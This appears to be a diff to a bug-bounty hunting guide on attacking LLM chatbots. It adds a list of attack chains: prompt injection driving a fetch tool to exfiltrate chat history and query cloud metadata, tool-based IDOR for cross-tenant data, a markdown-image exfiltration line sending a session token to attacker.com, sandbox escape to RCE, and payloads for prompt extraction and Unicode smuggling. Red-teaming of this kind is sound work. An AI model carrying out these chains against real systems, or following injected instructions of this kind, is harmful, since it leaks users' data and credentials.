@@ -41,4 +41,14 @@ Chatbot renders markdown → browser fires GET with sensitive data
 
 **Triage rule:** ASI alone = Informational. Must chain to IDOR/exfil/RCE/ATO for bounty.
 
+---
+
+## Related Skills & Chains
+
+- **`hunt-ssrf`** — Any LLM with a fetch tool is an SSRF primitive with elevated network position. Chain primitive: LLM tool-use (fetch_url) + SSRF → attacker URL exfils chat history AND fetches `169.254.169.254` IMDS from inside the LLM VPC.
+- **`hunt-idor`** — Chatbots that touch user data without per-session scoping become IDOR factories. Chain primitive: prompt injection + chatbot tool (`get_user`) → IDOR-via-AI → cross-tenant PII via "show last message from user 456".
+- **`hunt-xss`** — Markdown/HTML rendering of LLM output is an XSS vehicle (ASI09: Trust Exploitation). Chain primitive: indirect injection via uploaded doc → AI emits markdown image → browser fires GET `attacker.com?d={session.token}` → cookie exfil.
+- **`hunt-rce`** — Code-interpreter / sandbox tools are RCE-by-design when escape is possible. Chain primitive: prompt injection + code-interpreter tool → sandbox escape via Python `os.system` → RCE on AI worker.
+- **`security-arsenal`** — Load the LLM Payload Pack: ASCII smuggling (Unicode tag block U+E0000-U+E007F), system-prompt-extract phrases, markdown-exfil templates, indirect-injection PDF/HTML templates.
+- **`triage-validation`** — Apply the Body-Diff Rule: a system prompt leak alone is informational; require demonstrated cross-user data leak, tool-use exfil to attacker host, or RCE before reporting.
 
